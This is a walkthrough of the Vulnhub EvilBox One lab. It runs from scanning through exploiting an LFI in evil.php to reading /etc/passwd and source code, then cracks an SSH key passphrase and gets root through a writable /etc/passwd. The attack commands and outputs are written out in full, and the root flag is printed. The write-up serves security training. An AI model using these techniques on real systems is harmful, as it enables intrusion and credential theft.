# Vulnhub Evilbox


Vulnhub Training Waklthrough -- Evilbox。

<!--more-->

## Knowledge

- gobuster -- web directory scanner
- wfuzz -- parameter fuzzing tool
- php filter -- get the source code of php file
- LFI -- local file include
- john -- hash crack
- chang /etc/paswd file to change root's passwd

## 1. Environment Setup

OVA download link: https://www[.]vulnhub.com/entry/evilbox-one,736/

If use VMware to setup the environment, need to set up the network, change the network interface enpns3 to ens33, and then restrat the network.

## 2. Reconnaisence

### 1. IP Address

arp-scan scanner:

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ sudo arp-scan -l
[sudo] password for v4ler1an:
Interface: eth0, type: EN10MB, MAC: 00:0c:29:9d:5b:9e, IPv4: 172.16.86.138
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
172.16.86.1	5e:52:30:c9:b7:65	(Unknown: locally administered)
172.16.86.2	00:50:56:fd:f8:ec	VMware, Inc.
172.16.86.147	00:0c:29:8f:f7:63	VMware, Inc.
172.16.86.254	00:50:56:f7:8b:40	VMware, Inc.

8 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.403 seconds (106.53 hosts/sec). 4 responded
```

### 2. Port Info

nmap scanner:

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ nmap -T4 -A -Pn 172.16.86.147
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-10 03:25 EST
Nmap scan report for 172.16.86.147
Host is up (0.0025s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 44:95:50:0b:e4:73:a1:85:11:ca:10:ec:1c:cb:d4:26 (RSA)
|   256 27:db:6a:c7:3a:9c:5a:0e:47:ba:8d:81:eb:d6:d6:3c (ECDSA)
|_  256 e3:07:56:a9:25:63:d4:ce:39:01:c1:9a:d9:fe:de:64 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.70 seconds
```

Enable service:

| port | servie   |
| ---- | -------- |
| 22   | ssh      |
| 80   | http web |

The ssh service need username and password. The web service is a default page of Apache2:

![image-20231110163355489](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311101634806.png)

### 3. Web Directory

Find the other web url:

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tools/scan]
└─$ dirb http://172.16.86.147

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Fri Nov 10 03:54:10 2023
URL_BASE: http://172.16.86.147/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://172.16.86.147/ ----
+ http://172.16.86.147/index.html (CODE:200|SIZE:10701)
+ http://172.16.86.147/robots.txt (CODE:200|SIZE:12)
==> DIRECTORY: http://172.16.86.147/secret/
+ http://172.16.86.147/server-status (CODE:403|SIZE:278)

---- Entering directory: http://172.16.86.147/secret/ ----
+ http://172.16.86.147/secret/index.html (CODE:200|SIZE:4)

-----------------
END_TIME: Fri Nov 10 03:54:25 2023
DOWNLOADED: 9224 - FOUND: 4
```

We found a `/secret` directory and `robots.txt` file and so on, Access the robots.txt:

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ curl http://172.16.86.147/robots.txt
Hello H4x0r
```

Nothing. And access the `secret` directory:

```shell
──(v4ler1an㉿kali)-[~/Documents/tools/scan]
└─$ curl http://172.16.86.147/secret/





```

Nothing rertun, Keep find:

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tools/scan]
└─$ gobuster dir -u http://172.16.86.147:80/secret/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt -t 50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.16.86.147:80/secret/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 4]
/evil.php             (Status: 200) [Size: 0]
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

Well, found a `evil.php` file, access it:

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tools/scan]
└─$ curl http://172.16.86.147/secret/evil.php

```

Nothing return.

## 3. Exploit

Consider fuzz `evil.php`'s parameters:

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tools/scan]
└─$ ffuf -ic -c -r -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://172.16.86.147/secret/evil.php?FUZZ=/etc/passwd -mr "root:x"

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://172.16.86.147/secret/evil.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Regexp: root:x
________________________________________________

command                 [Status: 200, Size: 1398, Words: 13, Lines: 27, Duration: 2ms]
:: Progress: [20476/20476] :: Job [1/1] :: 5714 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
┌──(v4ler1an㉿kali)-[~/Documents/tools/scan/wfuzz]
└─$ ./wfuzz -c -u 'http://172.16.86.147/secret/evil.php?FUZZ=/etc/passwd' -w /usr/share/seclists/Discovery/Web-Content/big.txt --hh 0
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://172.16.86.147/secret/evil.php?FUZZ=/etc/passwd
Total requests: 20476

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000004959:   200        26 L     38 W       1398 Ch     "command"

Total time: 16.27521
Processed Requests: 20476
Filtered Requests: 20475
Requests/sec.: 1258.109
```

The parameter is `command`, we can access the evil.php with it:

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tools/scan]
└─$ curl http://172.16.86.147/secret/evil.php?command=/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
```

We can get a user named `mowree` , but we still have no password.

### 1. vire php source 

We can get the php version info through the command:

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tools/scan]
└─$ curl http://172.16.86.147/secret/evil.php?command=php --version
curl 8.3.0 (x86_64-pc-linux-gnu) libcurl/8.3.0 OpenSSL/3.0.11 zlib/1.2.13 brotli/1.0.9 zstd/1.5.5 libidn2/2.3.4 libpsl/0.21.2 (+libidn2/2.3.4) libssh2/1.11.0 nghttp2/1.58.0 librtmp/2.3 OpenLDAP/2.5.13
Release-Date: 2023-09-13
Protocols: dict file ftp ftps gopher gophers http https imap imaps ldap ldaps mqtt pop3 pop3s rtmp rtsp scp sftp smb smbs smtp smtps telnet tftp
Features: alt-svc AsynchDNS brotli GSS-API HSTS HTTP2 HTTPS-proxy IDN IPv6 Kerberos Largefile libz NTLM NTLM_WB PSL SPNEGO SSL threadsafe TLS-SRP UnixSockets zstd
```

So, we can consider to view the php page source through the php filter:

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tools/scan]
└─$ curl http://172.16.86.147/secret/evil.php?command=php://filter/convert.base64-encode/resource=evil.php
PD9waHAKICAgICRmaWxlbmFtZSA9ICRfR0VUWydjb21tYW5kJ107CiAgICBpbmNsdWRlKCRmaWxlbmFtZSk7Cj8+Cg==

┌──(v4ler1an㉿kali)-[~/Documents/tools/scan]
└─$ echo "PD9waHAKICAgICRmaWxlbmFtZSA9ICRfR0VUWydjb21tYW5kJ107CiAgICBpbmNsdWRlKCRmaWxlbmFtZSk7Cj8+Cg=="|base64 -d
<?php
    $filename = $_GET['command'];
    include($filename);
?>
```

We get the source code of `evil.php`.

(Things about php filter:https://mayi077.gitee.io/2020/08/09/phpfilter%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%BA%90%E7%A0%81/ )

### 2. Local File Include Vulnerability

As we can see in evil.php source code, the code is vulnerable to LFI, not RFI case it has not use "allow_url_open" or "allow_url_include" function. So, we just condier to use the LFI vulnerability to achive the shell.

We can find a ssh private key in `/home/mowree/.ssh/authorized_keys`  and a `id_rsa`, so we can consider to login ssh with `id_rsa` file.

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tools/crack]
└─$ ssh mowree@172.16.86.147 -i hash
Enter passphrase for key 'hash':
```

Well, the file has passphrase, so we need to get the passphrase.

### 3. hash crack

jphn has a script named [ssh2john](https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py), so we can brute force the passphase with john.

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tools/crack]
└─$ chmod 600 hash

┌──(v4ler1an㉿kali)-[~/Documents/tools/crack]
└─$ python ssh2join.py hash|tee hash1
hash:$sshng$0$8$9FB14B3F3D04E90E$1192$bae426d821487bf7994f9a4dc90ebe2b551aa7f15859cb04925cce36dfb1e003ba1668c5991f11529c0c1eeae66d10ba86aca88aff2f8294204113d83332774204bd9140867600b9f9c5e5342493fc6290392e103103144da723659f04273a1ea3bfbbb4207c664fec5bb6fc7379b80b3d02984e66badf19cae4e70744809460107d98eab2576e8078d9d6dd7b9a575bfa0cd618152629338b3bf81cb80642f938fe0681a46f68277a2300f39a095facbf76aab822bd744289bed2d385b2ea2d6fb03d5d3b9b80496c954126f1f196eb8917df1dcbb5746ca11d769fe92b67a4fe20e4f34e13161314755b1a7851bfe41ed5d3cddbc34016e005fe21d3cab208ec4611a5591ca695ff29c69cebf4ce1959fb3d7add28e9a553cad3b1f86dd2e0f520b5a2662e9ef260ba7312d004c2f2e016ce8439233e646b487e34ea1f52b56d7c967f3a786d30a5be33de3c1209d8ce1ec57ead4a94c8d91f19c84b76dd725e0c155d05dc7a71fa20ee92fc9f79e58aba8794bafccd7d52953d92aac9a26ead1aa7c585bf7f37499bef1756231071c81001a67e65bdab556d20ca27ec1228314a175a4f93c674914a2952d2f9b0f5b47072e943a12829f71fc79db57c2f64dfbd3c3183cd4704a6bf716022e4987fa172bd3aca952d96ef54ade3cb87f5ecf782804cae23a0e216ecef069cf74a06223edc7934a9a90bd64c9841506d323293c8433cc9172cb0666bfcc7559d85a6543e6911d0326ca05f046ff156ed82477efc0512b3949922caa4635d02e814c543cf7237d11a636e97d842cd839b633b31bdbac0d416e1f7fba9edf42bf231ae6ecc7e424fcee7909528bde081d768fbe5e2fc82a0f2d6f3d273b0d0ecbc6f0f86b9164693c8c29cca76d30fc106e43eee3292a80a91861199595f5fca1e8acdc2d610a3aafa772ed87440323eed286b15be70d27d2a7c34f8a34dd4d4fba7da2a9d23833e8836541784b4043df103fce9f9df7c3671a546a32624af92b66a912089370d1464bccc710a6d768360e8b515204f6fa681a6779eae797aacd7461d14d4fe507e13be57c5b36d5ce13faf9132daa05b52f4880801e029d322e77a0e95d0b51f65ffff5a96b5dafb89d67035b61a82a3963c4e28d2bc8d7b39f129d2eb62ebbdc3595689198ea97c5e2ef12f45db124d20b6922d2ed5fbc401cb153559b78507e9cb0e730ab9bef2401a1ebd43f8a4cf95e6c90fb00f0404403ccd78e8fdcc1875fb5ceb766b749bb848e569c825a904336bea0aa96e379084b38bbca7589afa678bd095652e86df9d48318b74339bd485da989f41d78f554e065c684838151fdf86edb348842037feab1d82a70c6801ed6d3262279597d1dac2959487872017c7abf84f7f63c7bd4d1ca73ecccdf637eb1f6e7d9739307d890d3f172911002774b4a4ca653ff65c5e344b3a5112417794436caf6fad66fb3a61834423587d77d609da048855223d672e74da8bdf7ebd87707bcfbc9c9ab8fd65e190df954d85e77444f61f47c5353140a9b9361c6cbafbaa92ff843a0d55714c7769e038364119d14e3a7be1d435359ee3bae72f5bb0c1144f822bcd1d92bafdc85cb26d552a0701eb9a64151462e44b623ff243958c88c52a4190e2b35158a568a3f1da46823f7f61bab5b12239572550c4fc8aeb4083c4b854

┌──(v4ler1an㉿kali)-[~/Documents/tools/crack]
└─$ john hash1 --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
unicorn          (hash)
1g 0:00:00:00 DONE (2023-11-12 22:59) 100.0g/s 124200p/s 124200c/s 124200C/s unicorn
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Now, we can login ssh with id_rsa.

### 4. login ssh

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tools/crack]
└─$ ssh mowree@172.16.86.147 -i hash
Enter passphrase for key 'hash':
Linux EvilBoxOne 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64
mowree@EvilBoxOne:~$ id
uid=1000(mowree) gid=1000(mowree) groups=1000(mowree),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

## 4. Privilege Escalation

Now we have normal username and can login ssh, we need to be root.

Find some application with root privilege:

```shell
mowree@EvilBoxOne:~$ find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
-rwsr-xr-x 1 root root 436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 51280 Jan 10  2019 /usr/bin/mount
-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
-rwsr-xr-x 1 root root 34888 Jan 10  2019 /usr/bin/umount
-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 63568 Jan 10  2019 /usr/bin/su
```

We has not found somenthing special. Return `/etc/passwd`:

```shell
mowree@EvilBoxOne:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mowree@EvilBoxOne:~$ ls -la /etc/passwd
-rw-rw-rw- 1 root root 1398 Aug 16  2021 /etc/passwd
```

Everyone can modify the `/etc/passwd`, 

So we can consider remove root's passwd, just remove `x` character. But it doesn't work.

Ok, change the root's passwd. Because the root's passwd is stored in `/etc/shadow` file, so here is `x` . We can just change `x` to password's MD5 hash,and then can change root's password.

```shell
mowree@EvilBoxOne:~$ openssl passwd -1
Password:								--> root's passwd is root
Verifying - Password:		--> root
$1$BVZFyXa8$KD/LR0zYZNZ1w5gurJUy4/
```

Change the root's passwd:

```shell
mowree@EvilBoxOne:~$ vi /etc/passwd
mowree@EvilBoxOne:~$ su
Password:
root@EvilBoxOne:/home/mowree# id
uid=0(root) gid=0(root) groups=0(root)
root@EvilBoxOne:/home/mowree# ls -la /root
total 24
drwx------  3 root root 4096 Aug 16  2021 .
drwxr-xr-x 18 root root 4096 Aug 16  2021 ..
lrwxrwxrwx  1 root root    9 Aug 16  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3526 Aug 16  2021 .bashrc
drwxr-xr-x  3 root root 4096 Aug 16  2021 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-r--------  1 root root   31 Aug 16  2021 root.txt
root@EvilBoxOne:/home/mowree# cat /root/root.txt
36QtXfdJWvdC0VavlPIApUbDlqTsBM
```

So, that;s all.

## Notes


